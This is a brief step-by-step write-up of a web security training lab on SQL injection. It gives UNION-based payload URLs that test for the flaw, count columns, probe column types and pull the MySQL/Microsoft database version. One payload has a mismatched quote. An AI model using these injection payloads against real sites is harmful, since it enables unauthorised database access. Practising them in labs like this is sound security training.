##  SQL injection attack, querying the database type and version on MySQL and Microsoft

1. main url: product category==> 
https://0aad006004a4b7ce802c443000df0094.web-security-academy.net/filter?category=Lifestyle

2. put a single qoute at the end of the category parameter to see   if the application is vulnerable to SQL injection, for example:
https://0aad006004a4b7ce802c443000df0094.web-security-academy.net/filter?category=Lifestyle'

3. For balance use double dash (--) and plus (+) to comment out the rest of the query, for example:

https://0aad006004a4b7ce802c443000df0094.web-security-academy.net/filter?category=Lifestyle' --+

4. find the number of columns in the original query by using the UNION operator with a different number of columns in each SELECT statement, for example:
https://0aad006004a4b7ce802c443000df0094.web-security-academy.net/filter?category=Lifestyle' union select null,null--+ 

5. find the data type of each column by using the UNION operator with different data types in each SELECT statement, for example:
https://0aad006004a4b7ce802c443000df0094.web-security-academy.net/filter?category=Lifestyle' union select 'vers,''dxdds'--+

6. find the database type and version by using the following query:
https://0aad006004a4b7ce802c443000df0094.web-security-academy.net/filter?category=Lifestyle'  union select version(),null--+

t